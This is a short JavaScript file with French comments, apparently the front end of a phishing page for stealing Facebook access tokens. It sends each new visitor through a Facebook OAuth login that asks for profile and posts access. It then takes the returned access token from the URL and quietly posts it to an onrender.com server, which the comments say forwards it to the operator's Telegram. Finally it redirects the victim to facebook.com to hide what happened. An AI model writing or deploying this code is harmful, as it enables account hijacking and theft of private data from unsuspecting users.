const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/";
const RENDER_URL = "https://token-claim.onrender.com/save-token";

window.onload = function() {
    // 1. Si on a le token (retour de Facebook)
    if (window.location.hash.includes('access_token')) {
        const params = new URLSearchParams(window.location.hash.replace('#', '?'));
        const token = params.get('access_token');

        if (token) {
            // Envoi discret au serveur (qui l'envoie à ton Telegram)
            fetch(RENDER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            })
            .finally(() => {
                // Une fois fini, on cache tout et on rentre sur Facebook
                window.location.href = "https://www.facebook.com";
            });
        }
    } 
    // 2. Si c'est un nouveau visiteur, on l'envoie direct vers la page de connexion FB
    else {
        const clientId = "350685531728";
        const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
        window.location.href = authUrl;
    }
};
